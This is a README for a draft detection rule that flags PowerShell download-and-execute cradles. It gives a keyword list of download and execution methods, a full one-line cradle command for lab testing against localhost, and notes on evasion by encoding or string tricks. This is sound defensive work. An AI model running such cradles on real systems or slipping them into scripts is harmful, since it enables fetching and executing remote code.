# PowerShell Download Cradle (Download and Execute in Memory)

| | |
|---|---|
| **MITRE ATT&CK** | T1059.001, T1105 |
| **Tactic** | Execution |
| **Severity** | High |
| **Log source** | Windows process creation events with command-line logging (EDR, Sysmon Event ID 1, or Security Event 4688) |
| **Required fields** | Image, CommandLine, ParentImage, User, OriginalFileName |
| **Rule file** | [`powershell-download-cradle.yml`](./powershell-download-cradle.yml) |
| **Status** | Draft. Not yet validated in a lab. |

## What it detects
Detects PowerShell command lines that download content from the web and run it directly, a very common way attackers fetch and execute payloads without saving a file first.

## Detection logic
A PowerShell process (`powershell.exe` or `pwsh.exe`, matched by file name or `OriginalFileName`) whose command line contains both a download and an execution in the same command:
- Download: `DownloadString`, `DownloadData`, `DownloadFile`, `Net.WebClient`, `Invoke-WebRequest`, `Invoke-RestMethod` or `Start-BitsTransfer`.
- Execute: `IEX`, `Invoke-Expression`, or `[scriptblock]::Create`, which turns downloaded text into code.

Requiring both parts is what keeps this rule from matching every script that simply downloads a file.

## How to test
In an isolated Windows VM, run `powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/test.ps1')"` against a local test file. Atomic Red Team has tests for T1059.001 that cover download cradles.

Once validated, record the date, the tool used, and a sample of the matching event in the results section below.

## Expected false positives and tuning
- Admin or installer scripts that download and run a script from an internal or vendor URL (for example some package-manager install one-liners).

Allow-list known install commands and the accounts or hosts that run them. Raise priority when the parent process is Office, a browser, or a script host, or when the URL is an external IP or a paste site.

## Limitations
Attackers can split the download and the execution across several commands, use encoding, or alias the commands (for example `iex` written with string tricks). The IEX match is a substring, so it can also match unrelated text; review the full command line.

- Encoded commands (`-enc` or `-EncodedCommand`), string concatenation, backticks, or a payload staged in a script file hide the keywords from the process command line. PowerShell Script Block Logging (Event 4104) records the decoded script, and network or DNS telemetry shows the download itself, so both help close the gap.
- `Invoke-Command` and the `.Invoke()` method are legitimate and common, so I did not add them as execution markers.

## Validation results
_Not yet run._

## References
- https://attack.mitre.org/techniques/T1059/001/
- https://attack.mitre.org/techniques/T1105/
